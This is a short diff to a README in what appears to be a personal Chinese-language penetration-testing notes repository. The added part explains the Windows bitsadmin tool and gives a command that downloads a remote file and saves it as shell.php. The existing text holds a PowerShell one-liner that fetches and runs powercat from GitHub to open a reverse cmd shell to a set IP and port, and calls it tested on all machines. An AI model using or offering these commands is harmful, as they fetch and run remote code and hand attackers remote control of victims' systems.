@@ -1,6 +1,17 @@
 # CheckLinux
 linux的基本属性脚本
 ———————————————————————————————————————————————————————————————
+# bitsadmin
+
+bitsadmin  可以用来在windows 命令行下下载文件。bitsadmin是windows 后台智能传输服务的一个工具，windows 的自动更新，补丁之类的下载就是用这个工具来实现的。Windows Server2003和XP是没有bitsadmin的，Winc7及其之后的机器才有。
+
+bitsadmin的一些特性：
+bitsadmin 可以在网络不稳定的状态下下载文件，出错会自动重试，可靠性应该相当不错。
+bitsadmin 可以跟随URL跳转.
+bitsadmin 不像curl  wget 这类工具那样能用来下载HTML页面。
+bitsadmin /transfer test http://files.cnblogs.com/files/gayhub/bcn.js  c:\users\xie\desktop\shell.php
+#"任务名" 可以随意起，保存文件的文件路径必须是已经存在的目录，否则不能下载。
+
 # cmd窗口下利用Powershell反弹NC shell 
 亲测所有机器都适用
 powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/zyh2580/CheckLinux/main/powercat.ps1');powercat -c 192.168.10.11 -p 8888 -e cmd
